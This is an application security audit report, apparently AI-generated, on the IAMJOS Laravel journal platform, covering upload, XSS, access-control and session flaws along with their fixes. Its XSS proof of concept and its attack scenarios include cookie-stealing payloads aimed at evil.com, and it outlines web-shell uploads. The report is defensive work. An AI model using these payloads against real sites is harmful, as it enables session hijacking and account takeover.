# IAMJOS Security Audit Report

**Date:** 2026-03-07  
**Audited by:** Claude Security Audit  
**Project:** IAMJOS — Laravel 12, PostgreSQL  
**Scope:** Comprehensive application security audit

---

## Executive Summary

A comprehensive security audit was performed on the IAMJOS academic journal platform. The audit identified **16 security findings** across multiple categories:

| Severity    | Count |
| ----------- | ----- |
| 🔴 CRITICAL | 3     |
| 🟠 HIGH     | 4     |
| 🟡 MEDIUM   | 5     |
| 🟢 LOW      | 4     |

The most critical findings relate to **unrestricted file upload** in the galley/production workflow (potential web shell upload), **unescaped HTML output** of user-generated content (XSS), and **unprotected API endpoints**. The codebase demonstrates generally good practices with Laravel's built-in protections but has several gaps that mirror known OJS 3.3 attack vectors.

---

## Vulnerability Summary Table

| ID      | Vulnerability                                    | Location                                      | Severity    | Status     |
| ------- | ------------------------------------------------ | --------------------------------------------- | ----------- | ---------- |
| SEC-001 | Galley Upload: No MIME/Extension Validation      | `ProductionWorkflowController.php:55`         | 🔴 CRITICAL | ✅ PATCHED |
| SEC-002 | Workflow File Upload: No MIME Validation         | `SubmissionWorkflowController.php:370`        | 🔴 CRITICAL | ✅ PATCHED |
| SEC-003 | Decision File Upload: No MIME Validation         | `ReviewWorkflowController.php:745`            | 🔴 CRITICAL | ✅ PATCHED |
| SEC-004 | Stored XSS via Unescaped Output ({!! !!})        | Multiple Blade views (100+ instances)         | 🟠 HIGH     | ✅ PATCHED |
| SEC-005 | API Endpoints Without Authentication             | `routes/api.php:9,12`                         | 🟠 HIGH     | ✅ PATCHED |
| SEC-006 | User Model Mass Assignment: `disabled` Field     | `app/Models/User.php:$fillable`               | 🟠 HIGH     | ✅ PATCHED |
| SEC-007 | Submission Files Stored on `public` Disk         | `SubmissionController.php:335`                | 🟠 HIGH     | ✅ PATCHED |
| SEC-008 | Session Cookie `secure` Flag Not Hardcoded       | `config/session.php:172`                      | 🟡 MEDIUM   | ✅ PATCHED |
| SEC-009 | Session Encryption Disabled by Default           | `config/session.php:50`                       | 🟡 MEDIUM   | ✅ PATCHED |
| SEC-010 | CKEditor Images Accessible Without Auth          | `SubmissionDiscussionController.php:404`      | 🟡 MEDIUM   | ✅ PATCHED |
| SEC-011 | ValidateApiKey Uses `env()` Directly             | `ValidateApiKey.php:35`                       | 🟡 MEDIUM   | ✅ PATCHED |
| SEC-012 | Discussion Files on Public Disk Without Auth     | `SubmissionDiscussionController.php:425`      | 🟡 MEDIUM   | ✅ PATCHED |
| SEC-013 | File Preview via Google Docs Viewer (Data Leak)  | `SubmissionFileController.php:187`            | 🟢 LOW      | ✅ PATCHED |
| SEC-014 | `$guarded = []` on MalwareScan/Finding Models    | `app/Models/MalwareScan.php:21`               | 🟢 LOW      | ✅ PATCHED |
| SEC-015 | `$request->all()` Usage in JournalUserManagement | `JournalUserManagementController.php:313,380` | 🟢 LOW      | ✅ PATCHED |
| SEC-016 | OAI-PMH Endpoint Open to Data Harvesting         | `routes/web.php:198`                          | 🟢 LOW      | ✅ PATCHED |

---

## Detailed Findings

---

### SEC-001 | Galley Upload: No MIME/Extension Validation

**Severity:** 🔴 CRITICAL  
**Category:** File Upload / Remote Code Execution  
**Location:** `app/Http/Controllers/Journal/ProductionWorkflowController.php` — `storeGalley()` method, line 55

**Description:**  
The galley upload endpoint validates only max file size (`max:51200`) but has **zero restriction on file type**. An attacker with Editor access can upload a `.php`, `.phtml`, or `.phar` file as a "galley" and potentially achieve Remote Code Execution (RCE).

**Current Validation:**

```php
$rules['file'] = 'required|file|max:51200'; // 50MB max — NO mimes!
```

**Impact:**  
Full server takeover via web shell. This is the **#1 attack vector** on OJS-like platforms.

**Proof of Concept:**

1. Attacker gains Editor/Admin access (or compromises one).
2. Navigates to any submission → Production tab → Upload Galley.
3. Uploads `shell.php` as the galley file.
4. File is stored in `storage/app/journals/{id}/galleys/{id}/shell-AbCdEfGh.php` on `local` disk.
5. Although `local` disk is not directly web-accessible, if symlinked or misconfigured, RCE is immediate.

**Recommendation:**

```php
$rules['file'] = 'required|file|mimes:pdf,xml,html,epub,doc,docx|max:51200';
```

Additionally, implement server-side MIME type verification:

```php
$realMime = $file->getMimeType(); // Uses fileinfo
$allowed = ['application/pdf', 'text/xml', 'text/html', 'application/epub+zip'];
if (!in_array($realMime, $allowed)) abort(422, 'Invalid file type');
```

**Priority:** Fix **today**

---

### SEC-002 | Workflow File Upload: No MIME Validation

**Severity:** 🔴 CRITICAL  
**Category:** File Upload / Remote Code Execution  
**Location:** `app/Http/Controllers/SubmissionWorkflowController.php` — `uploadFile()` method, line 370

**Description:**  
The workflow file upload endpoint accepts any file type with only a max size restriction:

```php
'file' => 'required|file|max:10240', // 10MB — NO mimes!
```

**Impact:**  
Same as SEC-001. Any authenticated user with stage access can upload executable files.

**Recommendation:**

```php
'file' => 'required|file|mimes:doc,docx,pdf,odt,rtf,xls,xlsx|max:10240',
```

**Priority:** Fix **today**

---

### SEC-003 | Decision File Upload: No MIME Validation

**Severity:** 🔴 CRITICAL  
**Category:** File Upload / Remote Code Execution  
**Location:** `app/Http/Controllers/ReviewWorkflowController.php` — `uploadDecisionFile()` method, line 745

**Description:**  
The editorial decision file upload accepts any file type:

```php
'file' => 'required|file|max:20480', // 20MB — NO mimes!
```

**Impact:**  
Same as SEC-001/002. Editor can upload malicious files during decision workflow.

**Recommendation:**

```php
'file' => 'required|file|mimes:doc,docx,pdf,odt,rtf|max:20480',
```

**Priority:** Fix **today**

---

### SEC-004 | Stored XSS via Unescaped Output

**Severity:** 🟠 HIGH  
**Category:** Cross-Site Scripting (XSS)  
**Location:** 100+ instances across Blade views

**Description:**  
The codebase extensively uses `{!! $variable !!}` to render user-generated HTML content without sanitization. Key vulnerable locations include:

| File                                 | Line                 | Variable                                           |
| ------------------------------------ | -------------------- | -------------------------------------------------- |
| `submissions/workflow.blade.php`     | 128                  | `$submission->abstract`                            |
| `submissions/show.blade.php`         | 5370                 | `$log->email_body`                                 |
| `reviewer/show.blade.php`            | 74, 306, 316         | `$submission->abstract`, `$assignment->comments_*` |
| `public/article.blade.php`           | 120                  | `$submission->abstract`                            |
| `public/about.blade.php`             | 15                   | `$aboutContent`                                    |
| `public/announcement/show.blade.php` | 36                   | `$announcement->content`                           |
| `public/issue.blade.php`             | 43                   | `$issue->description`                              |
| `site/page.blade.php`                | 34                   | `$page->content`                                   |
| `layouts/public.blade.php`           | 361                  | `$journal->page_footer`                            |
| `journal/public/article.blade.php`   | (references section) | `$linkedReferences`                                |

**Impact:**  
An attacker can inject JavaScript through submission abstracts, reviewer comments, announcements, or any CKEditor field. This can steal session cookies, impersonate admins, or deface pages.

**Proof of Concept:**

1. Submit an article with abstract: `<script>fetch('//evil.com?c='+document.cookie)</script>`
2. When any editor or public user views the article, the script executes.

**Recommendation:**

- Install **HTMLPurifier** (`mews/purifier` package) and sanitize all rich-text content before storage.
- For display-time sanitization: `{!! clean($content) !!}` using Purifier.
- For non-HTML fields, use `{{ }}` (escaped output).

**Priority:** Fix **this week**

---

### SEC-005 | API Endpoints Without Authentication

**Severity:** 🟠 HIGH  
**Category:** Authentication / Authorization  
**Location:** `routes/api.php` lines 9, 12

**Description:**  
Two API endpoints have **no authentication middleware**:

```php
Route::get('journal/{journal}/reviewers', [ReviewerApiController::class, 'index']);
Route::get('keywords', [KeywordController::class, 'index']);
```

The `validate_api_key` middleware is only applied to the empty `v1` group. The reviewer list endpoint is particularly concerning as it may expose reviewer identities.

**Impact:**

- Anyone can query the reviewer database for a journal — violating reviewer confidentiality, especially in double-blind review.
- The keywords endpoint leaks internal submission metadata.

**Recommendation:**

```php
Route::middleware('validate_api_key')->group(function () {
    Route::get('journal/{journal}/reviewers', ...);
    Route::get('keywords', ...);
});
```

Or use `auth:sanctum` if these are only used internally.

**Priority:** Fix **this week**

---

### SEC-006 | User Model Mass Assignment: `disabled` Field

**Severity:** 🟠 HIGH  
**Category:** Mass Assignment  
**Location:** `app/Models/User.php` — `$fillable` array

**Description:**  
The User model's `$fillable` includes security-sensitive fields:

- `disabled` — allows an attacker to re-enable their account
- `disabled_reason` — can be tampered with
- `must_change_password` — can be bypassed

If any Controller passes unfiltered request data to `User::update()`, these fields can be manipulated.

**Impact:**  
A disabled user could re-enable their account or bypass password change requirements.

**Recommendation:**
Remove `disabled`, `disabled_reason`, and `must_change_password` from `$fillable`. Set them explicitly in admin-only methods.

**Priority:** Fix **this week**

---

### SEC-007 | Submission Manuscript Stored on `public` Disk

**Severity:** 🟠 HIGH  
**Category:** Sensitive Data Exposure  
**Location:** `app/Http/Controllers/SubmissionController.php` — `store()` method, line 335

**Description:**  
The initial manuscript submission is stored on the `public` disk:

```php
$path = $file->store("journals/{$journal->id}/submissions/{$submission->id}", ['disk' => 'public']);
```

Files on the `public` disk are accessible via `storage/` symlink at predictable URLs.

**Impact:**  
Unpublished manuscripts (which are confidential during peer review) could be accessed by anyone who can guess or enumerate the file path: `https://iamjos.id/storage/journals/{uuid}/submissions/{uuid}/filename.pdf`.

**Recommendation:**
Store all submission files on `local` disk (not web-accessible). Serve them through an authenticated download endpoint (which already exists as `SubmissionFileController::download`).

```php
$path = $file->store("journals/{$journal->id}/submissions/{$submission->id}", 'local');
```

**Priority:** Fix **this week**

---

### SEC-008 | Session Cookie `secure` Flag Not Hardcoded

**Severity:** 🟡 MEDIUM  
**Category:** Session Security  
**Location:** `config/session.php:172`

**Description:**

```php
'secure' => env('SESSION_SECURE_COOKIE'),
```

If `SESSION_SECURE_COOKIE` is not set in `.env`, it defaults to `null` (not forced HTTPS). In production on HTTPS, this should always be `true`.

**Recommendation:**

```php
'secure' => env('SESSION_SECURE_COOKIE', true),
```

**Priority:** Fix **this month**

---

### SEC-009 | Session Encryption Disabled by Default

**Severity:** 🟡 MEDIUM  
**Category:** Session Security  
**Location:** `config/session.php:50`

**Description:**

```php
'encrypt' => env('SESSION_ENCRYPT', false),
```

Session data is stored unencrypted in the database by default.

**Recommendation:**

```php
'encrypt' => env('SESSION_ENCRYPT', true),
```

**Priority:** Fix **this month**

---

### SEC-010 | CKEditor Images Accessible Without Auth Check

**Severity:** 🟡 MEDIUM  
**Category:** Access Control  
**Location:** `app/Http/Controllers/SubmissionDiscussionController.php:404`

**Description:**  
CKEditor images are stored on the `public` disk at `uploads/ckeditor/` and accessible via direct URL without authentication. Images uploaded in private discussions between editors/reviewers become publicly accessible.

**Recommendation:**
Store on `local` disk and serve through authenticated route, or add a `VerifyDiscussionAccess` middleware.

**Priority:** Fix **this month**

---

### SEC-011 | ValidateApiKey Uses `env()` Directly

**Severity:** 🟡 MEDIUM  
**Category:** Configuration  
**Location:** `app/Http/Middleware/ValidateApiKey.php:35`

**Description:**

```php
$apiKey = env('API_KEY');
```

Using `env()` directly in middleware bypasses config caching. After `php artisan config:cache`, `env()` returns `null`, effectively **disabling API key validation**.

**Recommendation:**

```php
$apiKey = config('app.api_key'); // Add API_KEY to config/app.php
```

**Priority:** Fix **this month**

---

### SEC-012 | Discussion Files on Public Disk Without Auth

**Severity:** 🟡 MEDIUM  
**Category:** Access Control  
**Location:** `app/Http/Controllers/SubmissionDiscussionController.php:425`

**Description:**  
Discussion file attachments are stored on `public` disk at `discussion-files/` path.

**Recommendation:**
Same as SEC-010. Use `local` disk.

**Priority:** Fix **this month**

---

### SEC-013 | File Preview via Google Docs Viewer

**Severity:** 🟢 LOW  
**Category:** Data Leak  
**Location:** `app/Http/Controllers/SubmissionFileController.php:187`

**Description:**  
File previews generate a signed URL then send it to Google Docs Viewer. This means the file content is transmitted to Google's servers for rendering, which may violate data privacy policies for confidential peer review documents.

**Recommendation:**
Use a self-hosted PDF viewer (PDF.js) instead of Google Docs Viewer.

**Priority:** Fix **this month**

---

### SEC-014 | `$guarded = []` on Internal Models

**Severity:** 🟢 LOW  
**Category:** Mass Assignment  
**Location:** `app/Models/MalwareScan.php:21`, `app/Models/MalwareFinding.php:16`

**Description:**  
Both models use `$guarded = []`, allowing all fields to be mass-assigned. These are internal-only models not directly exposed to user input, so risk is low.

**Recommendation:**
Switch to explicit `$fillable` arrays.

**Priority:** Fix **this month**

---

### SEC-015 | `$request->all()` Usage in Logging Context

**Severity:** 🟢 LOW  
**Category:** Mass Assignment  
**Location:** `app/Http/Controllers/Admin/JournalUserManagementController.php` lines 313, 380

**Description:**  
`$request->all()` is used in metadata/logging context, not directly in model `create()` or `update()`. Risk is low but raw request data could contain unexpected fields.

**Recommendation:**
Use `$request->only([...])` or `$request->validated()`.

**Priority:** Fix **this month**

---

### SEC-016 | OAI-PMH Endpoint Open

**Severity:** 🟢 LOW  
**Category:** Data Harvesting  
**Location:** `routes/web.php:198`

**Description:**  
The OAI-PMH endpoint is open by design for academic indexing. However, without rate limiting, it could be abused for aggressive data harvesting.

**Recommendation:**
Add rate limiting middleware:

```php
Route::any('{journal}/oai', [OaiController::class, 'handle'])
    ->middleware('throttle:60,1')
    ->name('journal.oai');
```

**Priority:** Fix **this month**

---

## Attack Scenarios (Journal Platform Specific)

### Scenario 1: Web Shell Upload via Galley Production

1. **Entry:** Attacker registers as author, gets Editor access through social engineering or credential theft.
2. **Upload:** Navigates to any submission → Production → Upload Galley → Uploads `cmd.php` shell.
3. **Bypass:** No MIME validation exists. File is accepted and stored.
4. **Execution:** If storage is misconfigured (symlinked to public), attacker accesses `https://iamjos.id/storage/journals/.../cmd.php`.
5. **Impact:** Full RCE — read/write all files, dump database, pivot to other servers.

### Scenario 2: Stored XSS via Submission Abstract

1. **Entry:** Attacker submits a manuscript with malicious JS in the abstract field.
2. **Trigger:** Editor views the submission in the workflow dashboard.
3. **Payload:** `<img src=x onerror="fetch('//evil.com?c='+document.cookie)">`
4. **Impact:** Session hijacking of editor/admin accounts, leading to full platform takeover.

### Scenario 3: Data Exfiltration via Public Disk Storage

1. **Entry:** Any user submits a manuscript. File is stored on `public` disk.
2. **Discovery:** Attacker enumerates UUID paths or discovers paths from other XSS vectors.
3. **Access:** Directly downloads unpublished manuscripts via `https://iamjos.id/storage/journals/{id}/submissions/{id}/manuscript.pdf`.
4. **Impact:** Intellectual property theft, breach of peer review confidentiality.

---

## Remediation Roadmap

| Priority                       | Task                                                     | Effort    | ID               |
| ------------------------------ | -------------------------------------------------------- | --------- | ---------------- |
| 🔴 **CRITICAL (fix today)**    | Add MIME validation to `storeGalley()`                   | 15 min    | SEC-001          |
| 🔴 **CRITICAL (fix today)**    | Add MIME validation to `uploadFile()`                    | 15 min    | SEC-002          |
| 🔴 **CRITICAL (fix today)**    | Add MIME validation to `uploadDecisionFile()`            | 15 min    | SEC-003          |
| 🟠 **HIGH (fix this week)**    | Install HTMLPurifier & sanitize all `{!! !!}` outputs    | 2–4 hours | SEC-004          |
| 🟠 **HIGH (fix this week)**    | Add auth middleware to API reviewer & keywords endpoints | 15 min    | SEC-005          |
| 🟠 **HIGH (fix this week)**    | Remove `disabled` from User `$fillable`                  | 15 min    | SEC-006          |
| 🟠 **HIGH (fix this week)**    | Move manuscript storage from `public` to `local` disk    | 30 min    | SEC-007          |
| 🟡 **MEDIUM (fix this month)** | Hardcode session secure cookie to `true`                 | 5 min     | SEC-008          |
| 🟡 **MEDIUM (fix this month)** | Enable session encryption                                | 5 min     | SEC-009          |
| 🟡 **MEDIUM (fix this month)** | Move CKEditor/discussion files to local disk             | 30 min    | SEC-010, SEC-012 |
| 🟡 **MEDIUM (fix this month)** | Fix ValidateApiKey to use `config()`                     | 10 min    | SEC-011          |
| 🟢 **LOW**                     | Replace Google Docs Viewer with PDF.js                   | 2–4 hours | SEC-013          |
| 🟢 **LOW**                     | Switch $guarded to $fillable on internal models          | 15 min    | SEC-014          |
| 🟢 **LOW**                     | Replace `$request->all()` with explicit fields           | 15 min    | SEC-015          |
| 🟢 **LOW**                     | Add rate limiting to OAI-PMH                             | 10 min    | SEC-016          |

---

## Positive Security Controls Already in Place

The following security measures are already well-implemented:

1. **✅ SQL Injection Protection** — All `whereRaw()`, `selectRaw()`, and `DB::select()` queries use parameterized bindings. No string concatenation with user input detected.
2. **✅ CSRF Protection** — Laravel's `VerifyCsrfToken` middleware is active. Forms use `@csrf`.
3. **✅ Route Model Binding** — UUID-based model binding prevents ID enumeration.
4. **✅ `httpOnly` Cookies** — Session config has `http_only => true` (default).
5. **✅ SameSite Cookies** — Set to `lax` by default.
6. **✅ `.env` in `.gitignore`** — Environment file is properly excluded from version control.
7. **✅ Auth on File Downloads** — `SubmissionFileController::download()` performs role-based access checks.
8. **✅ Submission File Validation** — `SubmissionFileController::store()` properly validates MIME types.
9. **✅ Reviewer File Validation** — `ReviewerController::uploadAttachment()` validates `mimes:doc,docx,pdf,rtf`.
10. **✅ Race Condition Lock** — `SubmissionController::store()` uses Cache lock to prevent duplicate submissions.
11. **✅ Password Hashing** — User model uses Laravel's default bcrypt hashing.
12. **✅ Soft Deletes** — Most models use SoftDeletes for data recovery.
13. **✅ OAI-PMH Bindings** — `whereRaw` in OAI controller uses `?` bindings for date parameters.
14. **✅ ValidateApiKey Middleware** — Exists and validates API key header (though not applied everywhere).
15. **✅ Reviewer Auth Check** — `ReviewerController` verifies assignment ownership before allowing actions.
